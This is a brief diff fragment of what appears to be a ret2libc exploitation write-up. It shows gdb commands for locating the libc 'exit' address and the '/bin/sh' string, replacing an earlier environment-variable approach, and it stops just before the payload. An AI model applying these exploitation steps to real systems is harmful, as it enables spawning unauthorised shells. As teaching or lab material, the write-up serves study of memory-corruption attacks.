@@ -19,7 +19,7 @@ in gdb :
 
 `p exit` = **0xb7e5ebe0**
 
-`p *((char **)environ)`  = 0xbffff925 "EXPLOIT=/bin/sh"  = **0xbffff92d** "/bin/sh"
+`find &system,+9999999,"/bin/sh"` = **0xb7f8cc58**
 
 
 Our playload is : 
